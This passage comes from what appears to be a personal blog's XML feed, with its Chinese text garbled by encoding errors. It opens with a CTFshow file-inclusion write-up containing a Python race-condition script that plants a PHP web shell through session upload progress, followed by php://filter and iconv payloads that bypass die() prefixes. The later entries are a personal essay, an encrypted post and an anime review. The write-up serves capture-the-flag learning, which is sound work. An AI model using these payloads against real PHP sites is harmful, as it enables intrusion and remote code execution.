class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            url<span class="token punctuation">,</span>            data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span><span class="token string">"&lt;?php system('cat *');fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[mtfQ])?>');?>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'q.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessid<span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">READ</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">?file=/tmp/sess_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sessid<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+++]retry'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>POST<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    READ<span class="token punctuation">(</span>session<span class="token punctuation">)</span></code></pre><h4 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h4><p>æ¡ä»¶ç«äº‰åŒä¸Š</p><h4 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h4><p>æ·»åŠ äº†å¦‚ä¸‹ä»£ç </p><p>system(â€œrm -rf &#x2F;tmp&#x2F;*â€);</p><p>&#x2F;&#x2F; åœ¨ rm -rf &#x2F;tmp&#x2F;* æ‰§è¡Œä¹‹åç«‹åˆ»æœ‰æ–°çš„è¯·æ±‚åˆ›å»ºäº† sess_shell æ–‡ä»¶ æ¡ä»¶ç«äº‰ä¾ç„¶æœ‰æ•ˆ</p><h4 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h4><p>æ·»åŠ äº†ä¸€ä¸ªå†…å®¹è¯†åˆ«ï¼Œå¦‚æœæœ‰<code>&lt;</code>å°±dieï¼Œä¾æ—§å¯ä»¥ç«äº‰ã€‚</p><h4 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h4><p>dirname(<strong>FILE</strong>)è¡¨ç¤ºå½“å‰æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚set_include_pathå‡½æ•°,æ˜¯ç”¨æ¥è®¾ç½®includeçš„è·¯å¾„çš„ï¼Œå°±æ˜¯include()å¯ä»¥ä¸æä¾›æ–‡ä»¶çš„å®Œæ•´è·¯å¾„äº†ã€‚<br>includeæ–‡ä»¶æ—¶,å½“åŒ…å«è·¯å¾„æ—¢ä¸æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œä¹Ÿä¸æ˜¯ç»å¯¹è·¯å¾„æ—¶(å¦‚:include(â€œtest.phpâ€))ï¼Œä¼šå…ˆæŸ¥æ‰¾include_pathæ‰€è®¾ç½®çš„ç›®å½•ã€‚<br>è„šæœ¬é‡Œç”¨çš„æ˜¯å®Œæ•´è·¯å¾„ï¼Œä¸å½±å“ç«äº‰ã€‚</p><h4 id="web87-file-put-contents"><a href="#web87-file-put-contents" class="headerlink" title="web87(file_put_contents)"></a>web87(file_put_contents)</h4><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET['file']))&#123;    $file = $_GET['file'];    $content = $_POST['content'];    $file = str_replace("php", "???", $file);    $file = str_replace("data", "???", $file);    $file = str_replace(":", "???", $file);    $file = str_replace(".", "???", $file);    file_put_contents(urldecode($file), "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'å¤§ä½¬åˆ«ç§€äº†'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>".$content);&#125;</code></pre><p>file_put_contents() å‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ã€‚</p><p><a href="https://www.runoob.com/php/func-filesystem-file-put-contents.html">PHP file_put_contents() å‡½æ•°</a></p><p><a href="https://xz.aliyun.com/t/8163?time__1311=n4+xuDgDBDyGKAKD=D7Dl1oQ447wWhSwi2iD&alichlgref=https://xz.aliyun.com/t/8163#toc-3">file_put_contentå’Œæ­»äº¡Â·æ‚ç³…ä»£ç ä¹‹ç¼˜</a></p><p>å‚è€ƒå¤§ä½¬æ–‡ç« ï¼Œå¯ä»¥ä½¿ç”¨base64æˆ–è€…rot13æ¥è¿›è¡Œå¯¹å‰é¢ä»£ç è¿›è¡Œæ‚ç³…</p><p>é¦–å…ˆæ„é€ $fileï¼Œå› ä¸ºè¦å¯¹fileè¿›è¡Œä¸€æ¬¡urlè§£ç æ‰€ä»¥æˆ‘ä»¬å¯¹payloadè¿›è¡Œä¸¤æ¬¡urlç¼–ç </p><p>æ™šä¸Šå¤§å¤šå·¥å…·æ˜¯å¯¹è‹±æ–‡å­—ç¬¦ä¸è¿›è¡Œurlç¼–ç çš„ï¼Œæ‰€ä»¥è¿™é‡Œç»™å‡ºè„šæœ¬æ–¹ä¾¿è¿›è¡Œurlencode</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse<span class="token keyword">def</span> <span class="token function">encode_char</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># æŒ‡å®šå­—ç¬¦é›†ï¼Œè½¬æ¢ä¸ºASCIIç åï¼Œå†è½¬æ¢ä¸º16è¿›åˆ¶ï¼Œå¹¶æ·»åŠ %</span>    special_chars <span class="token operator">=</span> <span class="token string">"!#$&amp;'()*+,/:;=?@-._~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>    <span class="token keyword">if</span> char <span class="token keyword">in</span> special_chars<span class="token punctuation">:</span>        <span class="token comment"># è½¬æ¢ä¸ºASCIIç ï¼Œç„¶åè½¬æ¢ä¸º16è¿›åˆ¶ï¼Œå¹¶æ·»åŠ %</span>        <span class="token keyword">return</span> <span class="token string">'%&#123;:02x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment"># å¯¹å…¶ä»–å­—ç¬¦è¿›è¡ŒURLç¼–ç </span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">url_encode</span><span class="token punctuation">(</span>input_string<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># å¯¹å­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå­—ç¬¦è¿›è¡Œç¼–ç </span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>encode_char<span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token keyword">for</span> char <span class="token keyword">in</span> input_string<span class="token punctuation">)</span>input_string <span class="token operator">=</span> <span class="token string">"Test"</span>encoded_string <span class="token operator">=</span> url_encode<span class="token punctuation">(</span>input_string<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>encoded_string<span class="token punctuation">)</span></code></pre><blockquote><p>php:&#x2F;&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;hsad.php</p><p>ä¸¤æ¬¡ç¼–ç åå¾—åˆ°</p><p>file&#x3D;%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%38%25%37%33%25%36%31%25%36%34%25%32%65%25%37%30%25%36%38%25%37%30</p></blockquote><p>ç„¶åè¿›è¡ŒPost content</p><p>base64å¯ä»¥ç»•è¿‡dieå‡½æ•°ã€‚å› ä¸ºbase64ç¼–ç èŒƒå›´æ˜¯ <code>0 ï½ 9,a ï½ z,A ï½ Z,+,/ ï¼Œ</code>æ‰€ä»¥é™¤äº†è¿™äº›å­—ç¬¦ï¼Œå…¶ä»–å­—ç¬¦éƒ½ä¼šè¢«å¿½ç•¥æ‰ã€‚</p><p>base64è¿‡æ»¤ä¹‹åå°±åªæœ‰(phpdie)6ä¸ªå­—ç¬¦äº†ï¼Œbase64è¦æ±‚æŠŠæ¯ä¸‰ä¸ª8Bitçš„å­—èŠ‚è½¬æ¢ä¸ºå››ä¸ª6Bitçš„å­—èŠ‚ï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿè¦å‡‘å¤Ÿå››ä¸ªå­—èŠ‚çš„å€æ•°ï¼Œé¿å…base64è§£ç å‡ºé—®é¢˜ï¼Œè¿™é‡ŒåŠ ä¸Šä¸¤ä¸ªå­—ç¬¦å³å¯ã€‚</p><blockquote><p>â€‹                    <?php system("tac fl0g.php");?></p><p>content&#x3D;aaPD9waHAgc3lzdGVtKCJ0YWMgZmwwZy5waHAiKTs&#x2F;Pg&#x3D;&#x3D;</p></blockquote><h4 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h4><p>å‘ç°è¿‡æ»¤çš„è¿˜æ˜¯æ¯”è¾ƒå¤šï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤ : é‚£æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨PHPä¼ªåè®®å°±æ˜¯ è¿™é‡Œä½¿ç”¨çš„æ˜¯ data:&#x2F;&#x2F;text&#x2F;plain;base64,poc å…¶å®å’Œ79å·®ä¸å¤š åªæ˜¯æ³¨æ„çš„æ˜¯ç¼–ç æˆbase64çš„æ—¶å€™è¦å»æ‰ ï¼</p><h4 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h4><p>è®¿é—®ç½‘é¡µç»™äº†è§†é¢‘ï¼Œformoståˆ†è§£å‡ºæ¥æœ‰å›¾ç‰‡æ˜¯ç½‘ç«™æºç </p><p><img src="web116.png" loading="lazy"></p><p>ç„¶åç›´æ¥è®¿é—®flag.phpå°±è¡Œï¼Œè¯´å®è¯æœ‰ç‚¹æ‡µï¼Œå› ä¸ºè¿‡æ»¤æŒºç‹ çš„</p><h4 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h4><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">è°ˆä¸€è°ˆphp:&#x2F;&#x2F;filterçš„å¦™ç”¨</a></p><p><a href="https://blog.csdn.net/qq_44657899/article/details/109300335">php:&#x2F;&#x2F;filterçš„å„ç§è¿‡æ»¤å™¨</a></p><p>è¿™é“é¢˜è¿‡æ»¤äº†rot13ï¼Œbase64ï¼Œstringç­‰ä¸€äº›è¿‡æ»¤å™¨çš„å†…å®¹ï¼Œé‚£æ¢å…¶ä»–è¿‡æ»¤å™¨ä¸å°±å®Œäº‹äº†ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ç”¨<code>convert.iconv.*</code>è¿™ä¸ªè¿‡æ»¤å™¨ã€‚</p><p>payloadï¼š</p><blockquote><p>GET: ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.ucs-2be.ucs-2le&#x2F;resource&#x3D;a.php</p><p>ä»<code>UCS-2LE</code>ç¼–ç è½¬æ¢ä¸º<code>UCS-2BE</code>ç¼–ç </p><p>POST: contents&#x3D;?&lt;hp pvela$(G_TEâ€™[â€˜a)] ;&gt;?</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
            <tag> CTFshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>byeSophomore</title>
      <link href="/2024/06/26/byeSophomore/"/>
      <url>/2024/06/26/byeSophomore/</url>
      
        <content type="html"><![CDATA[<p>ç«¯åˆå›æ¥çš„é‚£å¤©ä¸‹åˆä¸å°å¿ƒéª¨æŠ˜äº†ï¼Œåˆšåˆšå®Œæˆäº†è¯¾è®¾ï¼Œé™¤äº†å¼€å­¦çš„ç¼“è€ƒå¤–ï¼Œå¯¹æˆ‘æ¥è¯´ï¼Œå¤§å­¦ç”Ÿæ´»å·²ç»æ‚„ç„¶è¿‡åŠ</p><p>è¯´èµ·æ¥ä¹ŸæŒºç¢Œç¢Œæ— ä¸ºçš„ï¼Œä½†ä¹Ÿä¸è‡³äºä¸€äº‹æ— æˆï¼Œåªæ˜¯è§‰å¾—è¿˜ä¸å¤Ÿã€‚å¯¹äºæœªæ¥çš„è§„åˆ’ï¼Œå¦ç™½è¯´æˆ‘åªæƒ³è€è€å®å®ä¸Šä¸ªç­èµšé’±ï¼Œå¤§å®¶éƒ½æƒ³èµšå¾—å¤šï¼Œå› ä¸ºè¿™æ ·æ‰æœ‰èµ„æ ¼èµå›å±äºè‡ªå·±çš„ä¸€ç‚¹è‡ªç”±ï¼Œä½†ä¹ŸæŒºè¿·èŒ«ï¼Œå› ä¸ºç¡®å®æ²¡æƒ³å¥½å…·å…·ä½“ä½“çš„æ–¹å‘ã€‚</p><blockquote><p>ç©ºè™šçš„å‹‰åŠ±å’Œæ²¹è…»çš„é¸¡æ±¤ä¸€æ ·ä»¤æˆ‘åèƒƒï¼Œå¦‚æœä¸€ä¸ªäººèƒ½è½»æ˜“åœ°é€šè¿‡å‡ å¥æ–‡å­—å¾—åˆ°åè¶³çš„åŠ¨åŠ›ï¼Œè¿™ä¸ªäººææ€•ä¹Ÿå•çº¯æ— è„‘è€Œæ˜“äºå—åˆ°åˆ©ç”¨ï¼›è€Œè¿œå¤§æ·±åˆ»çœŸæ­£æœ‰æ•ˆçš„æ¿€åŠ±ï¼Œå´æ˜¯ä¸€æ®µè¯æ— æ³•è¡¨è¾¾ã€è¡¨è¾¾åä¹Ÿæ— æ‰€è£¨ç›Šçš„ï¼šå†™å‡ºæ¥åªæ˜¯ç»™åˆ«äººçœ‹çš„è¡¨å†³å¿ƒï¼Œåˆä¸èƒ½æ·±åŒ–è¿™ä¸€æ¿€åŠ±ã€‚è¿™ä¸€ç±»çš„æ–‡å­—ï¼Œè¦ä¹ˆåªæ˜¯æµäºå½¢å¼çš„æ•·è¡ï¼Œè¦ä¹ˆå°±æ˜¯æµ…è–„çš„è¡¨éœ²ã€‚</p></blockquote><p>æ€»ä¹‹è¿˜å¾—å»åšå§ï¼Œç©ºæƒ³å€’ä¹Ÿæ²¡ä»€ä¹ˆç”¨ï¼Œæˆ‘å†™è¿™äº›ä¸œè¥¿ä¸çŸ¥é“è¦ç»™è°çœ‹ï¼Œä¹Ÿä¸çŸ¥é“è°ä¼šçœ‹åˆ°ï¼Œæˆ‘è¡¨è¾¾èƒ½åŠ›ä¸€å‘å¾ˆå¼±ï¼Œæ€»è§‰å¾—æ˜¯è¯»çš„ä¹¦å¤ªå°‘ï¼Œæ‰€ä»¥ä¹Ÿæ²¡æœ‰æƒ³ç€è‡ªå·±å†™çš„è¿™ç‚¹ä¸œè¥¿èƒ½ç»™åˆ«äººå¸¦æ¥ä»€ä¹ˆï¼Œå°±æƒ³è®°å½•ä¸€ä¸‹å§ã€‚</p><p>æƒ³äº†å¥½å¤šï¼Œè¿˜æ˜¯ç®—äº†</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Campus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯èƒ½çœŸçš„è¦ç­‰å¥½ä¹…äº†</title>
      <link href="/2024/06/17/%E8%BF%99%E4%BC%BC%E4%B9%8E%E6%98%AF%E4%B8%80%E4%B8%AA%E9%97%AD%E7%8E%AF/"/>
      <url>/2024/06/17/%E8%BF%99%E4%BC%BC%E4%B9%8E%E6%98%AF%E4%B8%80%E4%B8%AA%E9%97%AD%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e522772ea704707720a4ef0bc557a013923c8e9594f20e1e414419ebbbe9f8c7">6b09021c4fad842555217a8d07b3963feb852d3e21f8742f65fcd76a470d0bd132968d4640d394f9980075d76c1e54c55906bfeeb9d4b19a98ae91997175b4116f505795b7b910c3386a65db4722adc0cc05a4478c6a9bd4bc6e5b8233db3a139e6d31da6c7ea1cbea42884836829b6c085f5664568bc6ea1c32e141417bb618db4bb820f58414f39ada0f9301699f332f2d8ba91c4d9f00f587dfdd8cc25a9e1ba7e869aab6ca7897472cceec9c42aa5653556e963006430dd7ae93240198851e4c49c871bc97ab7c376e51e2a240f54137f454c6298e4c6cbc9ce8f28b83e42547ae361e88c61836a6f71400a33085d0aca6fa807d8e11bbf2dcd6962b286af488105934d22a04e9f2e0d96ebe14597baa789a4753c60d6d2737814d39d02a94c010763760ed4ab4d9c98a3ef4da26e48bae060cfd1a357e3f3f740da5b486e0604b5ad6ed6762c499a7ea8b843448c893679f123443b4998bde3cf7fd4145b6cef62f81d7d93737020320b0e23541555e880fea8707bb86efc5eb301b980d68362000fba23912338cfbc222360f316c5b26a09297697f0b442300a185fc224540ed14d4f6b9b56c2c90f2ccf70875ec7d2f03aa2b1cc2c4d1f01772d14154ffa797f4247e153da0f8b87550482fc337a7e7b2701c4e7180282ec6fc05cb25c71bfe2b3ca63a95e6bfa153832774b1da60405909979bbdadaccd13874f3d3bbc1506612118e8111ac08adfb6f4944da15f0d93e3e18cf22f942eef8640a5e921f340c074d93efa9ce303824ea2c2173c750b03d0ca025bdde24e3287f71e083c4dc81abfd7fd51f91600d50ca94a76a778bb4fd5f71fd66cd3f639ff2e4a4331ff5fc177482301680bb501c3aa8b25b079ed9a63752ed5abf85e1fdf4ae54fc04acac0e54b928cc7eb39fc987a11bba9050655b470f3fb2a159deea5e1ca7d573acce7c7f4a5250bc3249e4487c73f7a8ed7067d3dd09e6871dd0d448ed358c388430538ad145d5cfaaa472a7b7553d73281fa7aad8037dfdeb00aa2f53b3bb83b1fdfdb7a99749d58f2ce97369c95ab5561e7406501a9463e9f74f293dae82484bf02cd92e0ca53a6e307bcd513d26069177efad396a4628d4eeeb9c642d5211abc1ac9cd63eb1c6b3e1aef02390bf3e1dbc531fd2d3850f5a6397759de2bf295fd9068a3b7afb5cd1ff3f910e80d6c5ab4812c64688e7c9694b721c7e5c1ab547a11eafbbb71b30899639877c2b10719dcdf3ac1f215ea733cebacab4f4d019c6efbc82d4e474c076d65fc3c063e055be71425c0dcab0d48e1da8cb659adecb2ec4489fc0aa71d71613ffd694955df279aca61fd267d4ae1be23e399c0dca1df15aa793a02997fbeb87cc019e1bab7b78ea55e14783ad10f9b9508eb44314c89aac04aac3ae7f06e7b0897c5b79ed5829c064fa10e5db82d616ab1e9d82e253dc99d0bb8b3f868a0ba6f583f46335a49923edaf0c629c2fd85e87425fa40e6ad7f72a5174bc640dded86cad62e17cf2f75dde1c4e1519a30da2dd7dafc129992eaf346da628941bfe2404dc1471fde14548edf1fa018774df7f99c8f9094b05c7767b77cbc019ab4ab4d195afa0a50b0bc5063c3b6343a157d63ab54e10d084c861e2015e47e68ffda2d10cc0b79298b8f4a7c4b9d046ec861a32246220f1b46489b762a85f1d7d1f6488424d89b80d43f312f2b84232b0bcaced24921db52222da9ece94827544c8dfecf8790186634a966ec60c48fb5e0b7ee49b1ec97e5780c9a1497a3264a912483377f3a6cff979a0cf358c6d807627f1b490a41819be1e5ebfd4945c7d494b7f68eac8f8aeeae61697c3aaad07326063dd7a84b9b35f3c1fe2599ecd6c4080e3cc6e456555c68b10069f9dc4aa73c204b18290c2d9a7f4b28ef9acfa4bca8fa735f76da9f02cacb54913fd480204f5f33c2b636008571647a7e5d1d1ed8631fce3e9a5709260cb0c829586b556c5d175a6d2a72e6351d8ff252febae745c979657e7d276bc23ff0ab34a5f22445af1127d283e71ca7b3a84761334dc1d408944f66dea2647ab335cb1bb70da8143ce73711d8c77d59a29b14d42be38386f94ea7e2ee82cbfc155fae65db97f537970539391d0da75435d3b28c0b4dc7fc2cd732ccc48b024d9b87c605de90e0b7ef38e55195100a547d826cfa7159597a823577ce716ef8919ac4297a312bcb0c073b3146c3d66952756fb43cb4b37614dd0545f2ae17319a33fc1cf3fd3574b7c1cc3f04f76d93ac7aa564e3e6be54d8eaf86b784a48cbcf4420fb24692206291e3ce9a6bfac560c6c87473d68d778f792e8ced1f58c30c9f4b5d0542736606ed396f509a5810a4d20be921ab88e3c3c244bbb52a48fa92b33bdd4d9e69bfc7a875e46c6afc3f9312997af870cc69b9d81e3b0ac691c1afbbbc6c920729ebdacbdc487caf18a1a247768909f0cad6074b695cd9bcd7c3cae0c5aea4fc39c15c119bb893afefdcc703c8add147c7eb886b3197fb570e2472d07302d14fb13ee4e834d07f689c1082925bbb3d3d22bda707719c939c364faf76794a2656322958e904460a9f0b43090dcfb60a6ae7e9555916b662aadda62fbb96e70a8a16436ae100788e1cca5e9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Maybe have a guess</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¢ç¢å¿µ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CyberPunk</title>
      <link href="/2024/06/05/CyberPunk/"/>
      <url>/2024/06/05/CyberPunk/</url>
      
        <content type="html"><![CDATA[<p><img src="1.png" alt="CyberPunk" loading="lazy"></p><p><img src="2.png" loading="lazy"><em>Lucyå¸¦Davidç¬¬ä¸€æ¬¡æ¥æœˆçƒ</em></p><p>ä¹‹å‰æœ‰å¾ˆå¤šæœ‹å‹å®‰åˆ©è¿‡ï¼Œçœ‹åˆ°å¾ˆå¤šåŒå­¦å–œæ¬¢è¿™ä¸ªåŠ¨æ¼«ï¼Œçœ‹å®Œåä¸å‡ºæ„æ–™çš„éå¸¸å¥½çœ‹ </p><p>æœ€æ‰“åŠ¨æˆ‘çš„å½“ç„¶æ˜¯Lucyå’ŒDavidï¼ŒDavidä»ç¬¬ä¸€æ¬¡è¢«Lucyå¸¦è¿›æœˆçƒï¼Œå°±ä¸€ç›´è®°å¾—Lucyæœ€æƒ³å»æœˆçƒäº†ï¼ŒLucyä¸ºäº†ä¿æŠ¤Davidä¸€ç›´åœ¨ä¸é¡¾å±é™©çš„é»˜é»˜çš„ä»˜å‡ºï¼Œå°½ç®¡æœ€åå¹¶ä¸æ˜¯å®Œç¾çš„ç»“å±€ï¼Œä¸è¿‡æ„ŸåŠ¨æˆ‘çš„æ˜¯ä»–ä»¬å­˜åœ¨äºç»†ææœ«èŠ‚çš„æ¸©æŸ”ã€‚</p><p>å½“ç„¶ï¼Œä¸æ­¢ä»–ä»¬ï¼Œè¿˜æœ‰å¾ˆå¤šä»¤äººéš¾å¿˜çš„è§’è‰²å’Œå‡ºè‰²ç‹¬ç‰¹èƒŒæ™¯è®¾å®šã€‚</p><p>åœ¨å¤§å¤šæ•°ç§‘æŠ€è¢«é¡¶å±‚å„æ–­çš„æ—¶å€™ï¼Œæ¯ä¸ªäººéƒ½ç”Ÿæ´»åœ¨ç›‘æ§ä¹‹ä¸‹ï¼Œä»–ä»¬æ˜¯ä¸€ç¾¤æ¸¸ç¦»åœ¨ç¤¾ä¼šåº•å±‚å’ŒåŸå¸‚è¾¹ç¼˜çš„<em><strong>èµ›åšæœ‹å…‹</strong></em>ï¼Œä»–ä»¬çš„æ¢¦æƒ³å¯èƒ½æ˜¯è‡ªç”±å§ï¼Œä¸è¿‡æ¸´æ±‚è‡ªç”±ä¼¼ä¹å¤ªè¿‡å¥¢æœ›ï¼Œä¸è¿‡ä»–ä»¬ä»¥åŠå¾ˆå¤šä¼™ä¼´éƒ½æœ‰ç€å±äºCyberpunkçš„æµªæ¼«</p><p>åŠ¨æ¼«ä¸­çš„Bgmä¹ŸåŒæ ·å¥½å¬ï¼š<em>I Really Want to Stay at Your House</em></p><p><strong>ä¸€äº›å£çº¸â†“â†“â†“</strong></p><p><img src="3.png" alt="Lucy" loading="lazy"></p><p><img src="4.png" alt="Lucy" loading="lazy"></p><p><img src="5.png" alt="Lucy" loading="lazy"><em>Crazy but beautiful</em></p><p><img src="6.png" alt="Davidå’ŒLucyğŸ¥°" loading="lazy"></p><p><img src="7.png" alt="David&#39;s mom" loading="lazy"><em>Davidçš„éº»éº»ğŸ˜­</em></p><p><img src="8.png" alt="Rebecca" loading="lazy"><em>éå¸¸å¯çˆ±çš„å°å¥³å­©</em></p><p><img src="9.png" alt="Rebecca" loading="lazy"></p><p><img src="10.png" alt="Cyberpunk" loading="lazy"><em>å¤§åˆç…§</em></p><p><strong>è¿™ä¸ªä¸–ç•Œä¸Šæ²¡æœ‰ä»»ä½•äººèƒ½å®Œå…¨ä¿¡ä»»ï¼Œé™¤äº†ä½ è‡ªå·±ã€‚</strong></p><p><img src="14.png" alt="David" loading="lazy"></p><p><strong>å¯¹ä¸èµ·ï¼Œæˆ‘ä»¬ä¸èƒ½ä¸€èµ·ä¸Šæœˆçƒäº†ã€‚</strong></p><p><img src="11.png" loading="lazy"><em>Davidçš„é—è¨€ğŸ˜­ğŸ˜­ğŸ˜­</em></p><p><strong>èµ›åšæœ‹å…‹ä¸éƒ½æ˜¯åœ¨é€ƒé¿æŸç§å¯è€»äººç”Ÿçš„é€ƒéš¾è€…ï¼Œæˆ–æ˜¯æŠ±ç€é¥è¿œå¿—å‘è€Œè¿·å¤±è‡ªæˆ‘çš„é€æ¢¦è€…å— ï¼Ÿ</strong></p><p><img src="12.png" alt="Kiwi" loading="lazy"><em>é…·é…·çš„kiwi</em></p><p><strong>å›é¡¾è¿‡å»æ²¡æœ‰æ„ä¹‰ã€‚</strong></p><p><img src="13.png" alt="David" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Anime </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨-rce</title>
      <link href="/2024/06/03/web%E5%85%A5%E9%97%A8-rce/"/>
      <url>/2024/06/03/web%E5%85%A5%E9%97%A8-rce/</url>
      
